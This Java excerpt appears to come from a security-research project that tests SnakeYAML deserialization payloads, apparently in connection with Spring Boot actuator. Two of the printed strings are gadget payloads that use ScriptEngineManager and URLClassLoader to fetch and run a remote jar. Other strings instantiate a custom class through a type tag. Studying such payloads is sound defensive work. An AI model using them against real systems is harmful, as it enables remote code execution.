...
public class SnakeYAML {
  ...
  public static void main(String[] args) {
    ...
    printAndMatch("!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[ !!java.net.URL [\"http://127.0.0.1:80/common-1.0-SNAPSHOT.jar\"] ]]]");
    printAndMatch("!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [ \"http://127.0.0.1:80/common-1.0-SNAPSHOT.jar\"]]]]");
    printAndMatch("!!com.security.bug.spring.actuator.snakeyaml.A [   \"threedr3am\"]");
    printAndMatch("!!com.security.bug.spring.actuator.snakeyaml.A [\"threedr3am\"    ]");
    printAndMatch("!!com.security.bug.spring.actuator.snakeyaml.A [   \"threedr3am\"    ]");
    printAndMatch("!!com.security.bug.spring.actuator.snakeyaml.A [\"threedr3am\"]");

    //todo !!com.security.bug.feature.SnakeYAML$A {xx: threedr3am} 使用花括号的反序列化，构造顺序为：调用构造方法->反射设置public field，因此，基本没办法利用
    Yaml yaml = new Yaml();
    ...
    yaml.load("!!com.security.bug.feature.SnakeYAML$A {xx: threedr3am}");
